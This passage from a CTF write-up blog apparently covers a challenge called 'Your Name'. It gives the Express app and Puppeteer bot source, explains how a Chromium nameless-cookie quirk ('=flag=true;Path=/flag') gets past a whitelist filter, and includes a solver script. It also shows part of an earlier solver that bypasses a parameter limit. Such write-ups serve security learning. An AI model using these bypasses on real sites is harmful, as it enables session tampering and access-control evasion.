+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parse_args()
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>url
+</span></span><span style="display:flex;"><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;?&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1001</span>):
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;dummy</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">=x&amp;&#34;</span>
+</span></span><span style="display:flex;"><span>query <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;user=admin&#34;</span>
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> query)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 solve.py -u http://localhost:3000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sknb<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="your-name">Your Name</h1>
+<p>The following is the challenge source code.</p>
+<p>app/src/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">urlencoded</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>}));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">set</span>(<span style="color:#e6db74">&#34;view engine&#34;</span>, <span style="color:#e6db74">&#34;ejs&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/report&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#34;report.ejs&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/report&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">cookie</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#34;http://bot:3000/&#34;</span>, {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;POST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Content-Type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>,
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`cookie=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">cookie</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#66d9ef">await</span> <span style="color:#a6e22e">resp</span>.<span style="color:#a6e22e">text</span>());
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`app is running on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>));
+</span></span></code></pre></div><p>bot/src/index.js</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">puppeteer</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;puppeteer&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">port</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3000</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">urlencoded</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">extended</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>}));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">visit</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">cookie</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">whitelist</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^[a-zA-Z0-9=;\/]+$/</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pair</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">cookies</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">whitelist</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">pair</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;invalid cookie detected&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pair</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;flag=&#34;</span>)) {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;invalid cookie detected&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">browser</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">puppeteer</span>.<span style="color:#a6e22e">launch</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">executablePath</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/usr/bin/chromium&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headless</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">args</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--no-sandbox&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;--disable-gpu&#34;</span>,
+</span></span><span style="display:flex;"><span>        ],
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">context</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">createBrowserContext</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">setCookie</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;flag&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;false&#34;</span>,
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">page</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">newPage</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setDefaultTimeout</span>(<span style="color:#ae81ff">20000</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// for generating document
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">&#34;http://localhost:3000/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// set cookie
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">evaluate</span>(<span style="color:#a6e22e">c</span> =&gt; document.<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">c</span>, <span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">res</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#e6db74">&#34;http://localhost:3000/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">resp</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">text</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">resp</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">e</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">browser</span>.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;something went wrong&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">cookie</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cookie</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">typeof</span> (<span style="color:#a6e22e">cookie</span>) <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;invalid cookie&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">result</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">visit</span>(<span style="color:#a6e22e">cookie</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">result</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookieHeader</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>.<span style="color:#a6e22e">cookie</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">cookieHeader</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;no cookies :(&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookie</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">cookieHeader</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;;&#34;</span>)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">cookie</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;flag=true&#34;</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">GZCTF_FLAG</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;no flag for you&#34;</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">port</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`app is running on port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">port</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
+</span></span></code></pre></div><p>The goal is to set <code>flag=true</code> in bot&rsquo;s cookie. However, WAF is blocking it.</p>
+<p>bot/src/index.js</p>
+<div class="highlight" linestartno="13"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">whitelist</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/^[a-zA-Z0-9=;\/]+$/</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">cookies</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">cookie</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;;&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pair</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">cookies</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">whitelist</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">pair</span>)) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;invalid cookie detected&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">pair</span>.<span style="color:#a6e22e">startsWith</span>(<span style="color:#e6db74">&#34;flag=&#34;</span>)) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;invalid cookie detected&#34;</span>;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>        }
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    }
+</span></span></code></pre></div><p>WAF makes the following restrictions.</p>
+<ul>
+<li>only a-zA-Z0-9=;/ can be used</li>
+<li>starting with flag= is prohibited</li>
+</ul>
+<p>In chromium browser, there is an issue with nameless cookie. Nameless cookie is the cookie that has no name.</p>
+<pre tabindex="0"><code>=value
+</code></pre><p>When the browser parses the following nameless cookie, interesting behavior happens.</p>
+<pre tabindex="0"><code>Set-Cookie: =key=value
+</code></pre><p>The browser sets the cookie to Cookie header removing the first = character.</p>
+<pre tabindex="0"><code>Cookie: key=value
+</code></pre><blockquote>
+<p>According to the latest versions of the rfc6265bis, nameless cookies are serialized without a leading =.</p>
+<p><a href="https://issues.chromium.org/issues/40060539">https://issues.chromium.org/issues/40060539</a></p>
+</blockquote>
+<p>So it is possible to set flag to true with the following cookie.</p>
+<pre tabindex="0"><code>=flag=true
+</code></pre><p>However, flag cookie is already set by visit function.</p>
+<p>bot/src/index.js</p>
+<div class="highlight" linestartno="33"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">setCookie</span>({
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>        <span style="color:#a6e22e">domain</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;localhost&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>        <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;flag&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>        <span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;false&#34;</span>,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    });
+</span></span></code></pre></div><p>To solve this, put Path attribute to respect user&rsquo;s cookie.</p>
+<blockquote>
+<ol start="2">
+<li>The user agent SHOULD sort the cookie-list in the following order:<br>
+*  Cookies with longer paths are listed before cookies with<br>
+shorter paths.</li>
+</ol>
+<p><a href="https://datatracker.ietf.org/doc/html/rfc6265#section-5.4">https://datatracker.ietf.org/doc/html/rfc6265#section-5.4</a></p>
+</blockquote>
+<p>Final cookie is as follows.</p>
+<pre tabindex="0"><code>=flag=true;Path=/flag
+</code></pre><h2 id="solution-3">Solution</h2>
+<p>Here is solver</p>
+<p>solve.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_args</span>():
+</span></span><span style="display:flex;"><span>    parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(conflict_handler<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;resolve&#34;</span>)
+</span></span><span style="display:flex;"><span>    parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;-u&#34;</span>, <span style="color:#e6db74">&#34;--url&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;base url of the app&#34;</span>, type<span style="color:#f92672">=</span>str, required<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>args <span style="color:#f92672">=</span> parse_args()
+</span></span><span style="display:flex;"><span>base_url <span style="color:#f92672">=</span> args<span style="color:#f92672">.</span>url
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(base_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/report&#34;</span>, headers<span style="color:#f92672">=</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
+</span></span><span style="display:flex;"><span>}, data<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cookie==flag=true;Path=/flag&#34;</span>)
+</span></span><span style="display:flex;"><span>print(res<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 solve.py -u http://localhost:3000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sknb<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
+</span></span></code></pre></div>
+        
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+
+    
+    
+    
+</div>
+
+
+
+    
+
+        </main><footer class="footer">
+    
+    
+
+    
+
+    
+
+        
+            
+        
+
+        
+
+        
+        
+
+        
+
+    
+
+    
+        <span>&copy; 2025 sota70</span>
+    
+
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/gokarna-theme/gokarna-hugo">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
